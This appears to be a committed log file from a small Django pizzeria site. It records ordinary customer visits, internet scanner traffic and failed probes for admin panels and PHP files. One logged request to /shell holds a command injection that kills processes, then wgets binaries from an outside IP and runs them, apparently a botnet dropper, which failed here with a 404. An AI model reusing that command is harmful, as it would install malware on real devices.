+ - - [11/Feb/2025:19:46:43 +0000] "GET /checkout/ HTTP/1.1" 200 4219 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 19:47:03 +0000] [19486] [DEBUG] GET /checkout/
+ - - [11/Feb/2025:19:47:03 +0000] "GET /checkout/ HTTP/1.1" 200 4219 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 19:48:59 +0000] [19483] [DEBUG] GET /
+ - - [11/Feb/2025:19:48:59 +0000] "GET / HTTP/1.1" 200 6355 "http://34.39.141.209/checkout/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 19:49:14 +0000] [19484] [DEBUG] GET /amin/
+Not Found: /amin/
+ - - [11/Feb/2025:19:49:14 +0000] "GET /amin/ HTTP/1.1" 404 2522 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 19:49:26 +0000] [19485] [DEBUG] GET /amin
+Not Found: /amin
+ - - [11/Feb/2025:19:49:26 +0000] "GET /amin HTTP/1.1" 404 2519 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 19:49:34 +0000] [19486] [DEBUG] GET /
+/home/kaikydsousa/PizzariaDjango/pedidos/views.py:16: UnorderedObjectListWarning: Pagination may yield inconsistent results with an unordered object_list: <class 'pedidos.models.Produto'> QuerySet.
+  paginator = Paginator(produto_objetos, 4)
+ - - [11/Feb/2025:19:49:34 +0000] "GET / HTTP/1.1" 200 6355 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
+[2025-02-11 19:49:38 +0000] [19486] [DEBUG] GET /admin/
+ - - [11/Feb/2025:19:49:38 +0000] "GET /admin/ HTTP/1.1" 302 0 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 19:49:38 +0000] [19485] [DEBUG] GET /admin/login/
+ - - [11/Feb/2025:19:49:38 +0000] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 4160 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 19:57:24 +0000] [19483] [DEBUG] GET /manager/html
+Not Found: /manager/html
+ - - [11/Feb/2025:19:57:24 +0000] "GET /manager/html HTTP/1.1" 404 2543 "-" "Mozilla/5.0 zgrab/0.x"
+[2025-02-11 20:00:35 +0000] [19485] [DEBUG] GET /
+ - - [11/Feb/2025:20:00:35 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
+[2025-02-11 20:00:35 +0000] [19482] [DEBUG] GET /form.html
+Not Found: /form.html
+ - - [11/Feb/2025:20:00:35 +0000] "GET /form.html HTTP/1.1" 404 2534 "-" "curl/8.1.2"
+[2025-02-11 20:00:35 +0000] [19486] [DEBUG] GET /upl.php
+Not Found: /upl.php
+ - - [11/Feb/2025:20:00:35 +0000] "GET /upl.php HTTP/1.1" 404 2528 "-" "Mozilla/5.0"
+[2025-02-11 20:00:35 +0000] [19483] [DEBUG] GET /t4
+Not Found: /t4
+ - - [11/Feb/2025:20:00:35 +0000] "GET /t4 HTTP/1.1" 404 2513 "-" "Mozilla/5.0"
+[2025-02-11 20:00:36 +0000] [19483] [DEBUG] GET /geoip/
+Not Found: /geoip/
+ - - [11/Feb/2025:20:00:36 +0000] "GET /geoip/ HTTP/1.1" 404 2525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
+[2025-02-11 20:00:36 +0000] [19484] [DEBUG] GET /favicon.ico
+Not Found: /favicon.ico
+ - - [11/Feb/2025:20:00:36 +0000] "GET /favicon.ico HTTP/1.1" 404 2540 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
+[2025-02-11 20:00:36 +0000] [19484] [DEBUG] GET /1.php
+Not Found: /1.php
+ - - [11/Feb/2025:20:00:36 +0000] "GET /1.php HTTP/1.1" 404 2522 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
+[2025-02-11 20:00:37 +0000] [19484] [DEBUG] GET /systembc/password.php
+Not Found: /systembc/password.php
+ - - [11/Feb/2025:20:00:37 +0000] "GET /systembc/password.php HTTP/1.1" 404 2570 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
+[2025-02-11 20:00:37 +0000] [19484] [DEBUG] GET /password.php
+Not Found: /password.php
+ - - [11/Feb/2025:20:00:37 +0000] "GET /password.php HTTP/1.1" 404 2543 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
+[2025-02-11 20:09:51 +0000] [19486] [DEBUG] GET /
+ - - [11/Feb/2025:20:09:51 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 20:09:52 +0000] [19481] [DEBUG] GET /favicon.ico
+Not Found: /favicon.ico
+ - - [11/Feb/2025:20:09:52 +0000] "GET /favicon.ico HTTP/1.1" 404 2540 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 20:14:41 +0000] [19481] [DEBUG] GET /
+ - - [11/Feb/2025:20:14:41 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 20:14:43 +0000] [19483] [DEBUG] GET /favicon.ico
+Not Found: /favicon.ico
+ - - [11/Feb/2025:20:14:43 +0000] "GET /favicon.ico HTTP/1.1" 404 2540 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 20:14:50 +0000] [19482] [DEBUG] GET /checkout
+ - - [11/Feb/2025:20:14:50 +0000] "GET /checkout HTTP/1.1" 301 0 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 20:14:51 +0000] [19484] [DEBUG] GET /checkout/
+ - - [11/Feb/2025:20:14:51 +0000] "GET /checkout/ HTTP/1.1" 200 4219 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 20:15:14 +0000] [19484] [DEBUG] GET /
+ - - [11/Feb/2025:20:15:14 +0000] "GET / HTTP/1.1" 200 6355 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 20:42:59 +0000] [19482] [DEBUG] GET /favicon.ico
+Not Found: /favicon.ico
+ - - [11/Feb/2025:20:42:59 +0000] "GET /favicon.ico HTTP/1.1" 404 2540 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 20:43:03 +0000] [19486] [DEBUG] GET /
+ - - [11/Feb/2025:20:43:03 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 20:43:07 +0000] [19486] [DEBUG] GET /checkout/
+ - - [11/Feb/2025:20:43:07 +0000] "GET /checkout/ HTTP/1.1" 200 4219 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 20:47:22 +0000] [19483] [DEBUG] GET /
+ - - [11/Feb/2025:20:47:22 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Linux; Android 13; moto g52 Build/T2SRS33.72-22-4-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36"
+[2025-02-11 20:47:24 +0000] [19481] [DEBUG] GET /favicon.ico
+Not Found: /favicon.ico
+ - - [11/Feb/2025:20:47:24 +0000] "GET /favicon.ico HTTP/1.1" 404 2540 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 13; moto g52 Build/T2SRS33.72-22-4-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36"
+[2025-02-11 20:47:28 +0000] [19486] [DEBUG] GET /checkout
+ - - [11/Feb/2025:20:47:28 +0000] "GET /checkout HTTP/1.1" 301 0 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 13; moto g52 Build/T2SRS33.72-22-4-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36"
+[2025-02-11 20:47:28 +0000] [19486] [DEBUG] GET /checkout/
+ - - [11/Feb/2025:20:47:28 +0000] "GET /checkout/ HTTP/1.1" 200 4219 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 13; moto g52 Build/T2SRS33.72-22-4-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36"
+[2025-02-11 21:00:30 +0000] [19481] [DEBUG] GET /
+ - - [11/Feb/2025:21:00:30 +0000] "GET / HTTP/1.1" 200 6355 "-" "Hello World"
+[2025-02-11 21:03:49 +0000] [19486] [DEBUG] GET /
+ - - [11/Feb/2025:21:03:49 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Linux; Android 13; moto g52 Build/T2SRS33.72-22-4-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36"
+[2025-02-11 21:03:49 +0000] [19485] [DEBUG] GET /favicon.ico
+Not Found: /favicon.ico
+ - - [11/Feb/2025:21:03:49 +0000] "GET /favicon.ico HTTP/1.1" 404 2540 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 13; moto g52 Build/T2SRS33.72-22-4-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36"
+[2025-02-11 21:03:52 +0000] [19484] [DEBUG] GET /checkout/
+ - - [11/Feb/2025:21:03:52 +0000] "GET /checkout/ HTTP/1.1" 200 4219 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 13; moto g52 Build/T2SRS33.72-22-4-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36"
+[2025-02-11 21:05:41 +0000] [19482] [DEBUG] GET /favicon.ico
+Not Found: /favicon.ico
+ - - [11/Feb/2025:21:05:41 +0000] "GET /favicon.ico HTTP/1.1" 404 2540 "http://34.39.141.209/checkout/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 21:08:04 +0000] [19481] [DEBUG] GET /checkout/
+ - - [11/Feb/2025:21:08:04 +0000] "GET /checkout/ HTTP/1.1" 200 4219 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 21:12:12 +0000] [19485] [DEBUG] GET /checkout/
+ - - [11/Feb/2025:21:12:12 +0000] "GET /checkout/ HTTP/1.1" 200 4219 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 21:21:41 +0000] [19486] [DEBUG] GET /
+ - - [11/Feb/2025:21:21:41 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
+[2025-02-11 21:21:43 +0000] [19485] [DEBUG] GET /favicon.ico
+Not Found: /favicon.ico
+ - - [11/Feb/2025:21:21:43 +0000] "GET /favicon.ico HTTP/1.1" 404 2540 "http://34.39.141.209/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
+[2025-02-11 21:21:43 +0000] [19481] [DEBUG] GET /checkout
+ - - [11/Feb/2025:21:21:43 +0000] "GET /checkout HTTP/1.1" 301 0 "http://34.39.141.209/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
+[2025-02-11 21:21:44 +0000] [19481] [DEBUG] GET /checkout/
+ - - [11/Feb/2025:21:21:44 +0000] "GET /checkout/ HTTP/1.1" 200 4219 "http://34.39.141.209/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
+[2025-02-11 21:30:33 +0000] [19482] [DEBUG] GET /
+ - - [11/Feb/2025:21:30:33 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
+[2025-02-11 21:31:23 +0000] [19485] [DEBUG] GET /
+ - - [11/Feb/2025:21:31:23 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
+[2025-02-11 21:31:24 +0000] [19484] [DEBUG] GET /form.html
+Not Found: /form.html
+ - - [11/Feb/2025:21:31:24 +0000] "GET /form.html HTTP/1.1" 404 2534 "-" "curl/8.1.2"
+[2025-02-11 21:31:24 +0000] [19484] [DEBUG] GET /upl.php
+Not Found: /upl.php
+ - - [11/Feb/2025:21:31:24 +0000] "GET /upl.php HTTP/1.1" 404 2528 "-" "Mozilla/5.0"
+[2025-02-11 21:31:25 +0000] [19481] [DEBUG] GET /t4
+Not Found: /t4
+ - - [11/Feb/2025:21:31:25 +0000] "GET /t4 HTTP/1.1" 404 2513 "-" "Mozilla/5.0"
+[2025-02-11 21:31:26 +0000] [19482] [DEBUG] GET /geoip/
+Not Found: /geoip/
+ - - [11/Feb/2025:21:31:26 +0000] "GET /geoip/ HTTP/1.1" 404 2525 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
+[2025-02-11 21:31:26 +0000] [19482] [DEBUG] GET /favicon.ico
+Not Found: /favicon.ico
+ - - [11/Feb/2025:21:31:26 +0000] "GET /favicon.ico HTTP/1.1" 404 2540 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
+[2025-02-11 21:31:27 +0000] [19483] [DEBUG] GET /1.php
+Not Found: /1.php
+ - - [11/Feb/2025:21:31:27 +0000] "GET /1.php HTTP/1.1" 404 2522 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
+[2025-02-11 21:31:28 +0000] [19486] [DEBUG] GET /systembc/password.php
+Not Found: /systembc/password.php
+ - - [11/Feb/2025:21:31:28 +0000] "GET /systembc/password.php HTTP/1.1" 404 2570 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
+[2025-02-11 21:31:28 +0000] [19485] [DEBUG] GET /password.php
+Not Found: /password.php
+ - - [11/Feb/2025:21:31:28 +0000] "GET /password.php HTTP/1.1" 404 2543 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
+[2025-02-11 21:52:33 +0000] [19482] [DEBUG] GET /favicon.ico
+Not Found: /favicon.ico
+ - - [11/Feb/2025:21:52:33 +0000] "GET /favicon.ico HTTP/1.1" 404 2540 "http://34.39.141.209/checkout/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-11 21:54:01 +0000] [19483] [DEBUG] GET /
+ - - [11/Feb/2025:21:54:01 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
+[2025-02-11 22:08:38 +0000] [19485] [DEBUG] GET /favicon.ico
+Not Found: /favicon.ico
+ - - [11/Feb/2025:22:08:38 +0000] "GET /favicon.ico HTTP/1.1" 404 2540 "http://34.39.141.209/checkout/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-12 00:07:01 +0000] [19486] [DEBUG] GET /
+ - - [12/Feb/2025:00:07:01 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
+[2025-02-12 01:19:19 +0000] [19481] [DEBUG] GET /
+ - - [12/Feb/2025:01:19:19 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15"
+[2025-02-12 01:21:21 +0000] [19483] [DEBUG] GET /webui/
+Not Found: /webui/
+ - - [12/Feb/2025:01:21:21 +0000] "GET /webui/ HTTP/1.1" 404 2525 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15"
+[2025-02-12 01:22:40 +0000] [19486] [DEBUG] GET /favicon.ico
+Not Found: /favicon.ico
+ - - [12/Feb/2025:01:22:40 +0000] "GET /favicon.ico HTTP/1.1" 404 2540 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 OPR/95.0.0.0"
+[2025-02-12 01:23:18 +0000] [19481] [DEBUG] GET /geoserver/web/
+Not Found: /geoserver/web/
+ - - [12/Feb/2025:01:23:18 +0000] "GET /geoserver/web/ HTTP/1.1" 404 2549 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15"
+[2025-02-12 01:26:18 +0000] [19483] [DEBUG] GET /
+ - - [12/Feb/2025:01:26:18 +0000] "GET / HTTP/1.1" 200 6355 "-" "Hello World"
+[2025-02-12 02:14:20 +0000] [19485] [DEBUG] GET /
+ - - [12/Feb/2025:02:14:20 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[2025-02-12 03:22:04 +0000] [19484] [DEBUG] GET /shell
+Not Found: /shell
+ - - [12/Feb/2025:03:22:04 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+arm4+arm7;wget+http:/\/176.65.140.135/efefa7;chmod+777+efefa7;./efefa7+jaws;wget+http:/\/176.65.140.135/drea4;chmod+777+drea4;./drea4+jaws HTTP/1.1" 404 2800 "-" "KrebsOnSecurity"
+[2025-02-12 03:30:42 +0000] [19482] [DEBUG] GET /
+ - - [12/Feb/2025:03:30:42 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
+[2025-02-12 03:32:09 +0000] [19481] [DEBUG] GET /
+ - - [12/Feb/2025:03:32:09 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[2025-02-12 03:32:10 +0000] [19482] [DEBUG] GET /favicon.ico
+Not Found: /favicon.ico
+ - - [12/Feb/2025:03:32:10 +0000] "GET /favicon.ico HTTP/1.1" 404 2540 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[2025-02-12 03:32:35 +0000] [19483] [DEBUG] GET /actuator/gateway/routes
+Not Found: /actuator/gateway/routes
+ - - [12/Feb/2025:03:32:35 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 2576 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
+[2025-02-12 04:23:55 +0000] [19482] [DEBUG] GET /
+ - - [12/Feb/2025:04:23:55 +0000] "GET / HTTP/1.1" 200 6355 "-" "l9tcpid/v1.1.0"
+[2025-02-12 05:36:27 +0000] [19486] [DEBUG] GET /
+ - - [12/Feb/2025:05:36:27 +0000] "GET / HTTP/1.1" 200 6355 "-" "Hello World"
+[2025-02-12 06:00:44 +0000] [19481] [DEBUG] GET /druid/index.html
+Not Found: /druid/index.html
+ - - [12/Feb/2025:06:00:44 +0000] "GET /druid/index.html HTTP/1.1" 404 2555 "-" "Mozilla/5.0 zgrab/0.x"
+[2025-02-12 06:08:21 +0000] [19484] [DEBUG] GET /
+ - - [12/Feb/2025:06:08:21 +0000] "GET / HTTP/1.1" 200 6355 "-" "MobileSafari/600.1.4 CFNetwork/711.1.12 Darwin/14.0.0"
+[2025-02-12 07:03:07 +0000] [19484] [DEBUG] GET /
+ - - [12/Feb/2025:07:03:07 +0000] "GET / HTTP/1.1" 200 6355 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
+[2025-02-12 08:56:14 +0000] [19481] [DEBUG] GET /
+ - - [12/Feb/2025:08:56:14 +0000] "GET / HTTP/1.1" 200 6355 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
+[2025-02-12 08:57:38 +0000] [19485] [DEBUG] GET /
+ - - [12/Feb/2025:08:57:38 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
+[2025-02-12 09:23:28 +0000] [19485] [DEBUG] GET /
+ - - [12/Feb/2025:09:23:28 +0000] "GET / HTTP/1.1" 200 6355 "-" "Hello World"
+[2025-02-12 09:53:46 +0000] [19485] [DEBUG] GET /
+ - - [12/Feb/2025:09:53:46 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 zgrab/0.x"
+[2025-02-12 09:56:24 +0000] [19484] [DEBUG] GET /
+ - - [12/Feb/2025:09:56:24 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (compatible; ModatScanner/1.0; +https://modat.io/)"
+[2025-02-12 10:26:20 +0000] [19485] [DEBUG] GET /
+ - - [12/Feb/2025:10:26:20 +0000] "GET / HTTP/1.1" 200 6355 "-" "-"
+[2025-02-12 10:26:29 +0000] [19483] [DEBUG] GET /
+ - - [12/Feb/2025:10:26:29 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[2025-02-12 10:26:32 +0000] [19484] [DEBUG] GET /favicon.ico
+Not Found: /favicon.ico
+ - - [12/Feb/2025:10:26:32 +0000] "GET /favicon.ico HTTP/1.1" 404 2540 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[2025-02-12 11:50:43 +0000] [19486] [DEBUG] GET /
+ - - [12/Feb/2025:11:50:43 +0000] "GET / HTTP/1.1" 200 6355 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
+[2025-02-12 12:53:30 +0000] [19482] [DEBUG] GET /hudson
+Not Found: /hudson
+ - - [12/Feb/2025:12:53:30 +0000] "GET /hudson HTTP/1.1" 404 2525 "-" "Mozilla/5.0 zgrab/0.x"
+[2025-02-12 13:04:49 +0000] [19483] [DEBUG] GET /cdn-cgi/trace
+Invalid HTTP_HOST header: 'speed.cloudflare.com'. You may need to add 'speed.cloudflare.com' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/kaikydsousa/PizzariaDjango/venv/lib/python3.11/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/kaikydsousa/PizzariaDjango/venv/lib/python3.11/site-packages/django/utils/deprecation.py", line 128, in __call__
+    response = self.process_request(request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/kaikydsousa/PizzariaDjango/venv/lib/python3.11/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+           ^^^^^^^^^^^^^^^^^^
+  File "/home/kaikydsousa/PizzariaDjango/venv/lib/python3.11/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'speed.cloudflare.com'. You may need to add 'speed.cloudflare.com' to ALLOWED_HOSTS.
+Bad Request: /cdn-cgi/trace
+ - - [12/Feb/2025:13:04:49 +0000] "GET /cdn-cgi/trace HTTP/1.1" 400 57697 "-" "Mozilla/5.0"
+[2025-02-12 13:35:52 +0000] [19483] [DEBUG] GET /
+ - - [12/Feb/2025:13:35:52 +0000] "GET / HTTP/1.1" 200 6355 "-" "python-requests/2.32.3"
+[2025-02-12 13:50:58 +0000] [19485] [DEBUG] GET /
+ - - [12/Feb/2025:13:50:58 +0000] "GET / HTTP/1.1" 200 6355 "-" "Hello World"
+[2025-02-12 14:02:00 +0000] [19484] [DEBUG] HEAD /robots.txt
+Not Found: /robots.txt
+ - - [12/Feb/2025:14:02:00 +0000] "HEAD /robots.txt HTTP/1.1" 404 2538 "-" "-"
+[2025-02-12 14:23:25 +0000] [19486] [DEBUG] GET /
+ - - [12/Feb/2025:14:23:25 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16B92 MicroMessenger/7.0.5(0x17000523) NetType/WIFI Language/zh_CN"
+[2025-02-12 14:40:58 +0000] [19481] [DEBUG] GET /
+ - - [12/Feb/2025:14:40:58 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+[2025-02-12 14:59:07 +0000] [19484] [DEBUG] GET /
+ - - [12/Feb/2025:14:59:07 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
+[2025-02-12 15:11:29 +0000] [19482] [DEBUG] GET /
+ - - [12/Feb/2025:15:11:29 +0000] "GET / HTTP/1.1" 200 6355 "android-app://com.google.android.googlequicksearchbox/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
